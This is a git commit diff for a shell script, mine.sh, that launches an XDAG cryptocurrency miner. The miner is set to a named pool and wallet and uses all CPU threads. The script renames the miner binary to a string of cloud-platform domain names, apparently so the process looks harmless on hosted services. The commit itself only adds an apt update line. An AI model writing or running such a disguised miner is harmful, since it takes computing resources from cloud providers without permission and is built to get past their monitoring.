ceb9cd1f6cd6d6d3bcd87beea2bc2ef61a2021d9
muhammadajimukti558 <107189622+muhammadajimukti558@users.noreply.github.com>
2022-07-14 04:59:23 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
+apt update
 chmod u+x surabi
 mv surabi scalingo.com.google.com.heroku.com.github.com
 ./scalingo.com.google.com.heroku.com.github.com --disable-gpu --algorithm xdag --pool equal.xdag.org:13656 --wallet a+dc1CL2NRgbtPvLtys614KSKlv5rdYw --password x --cpu-threads $(nproc --all)
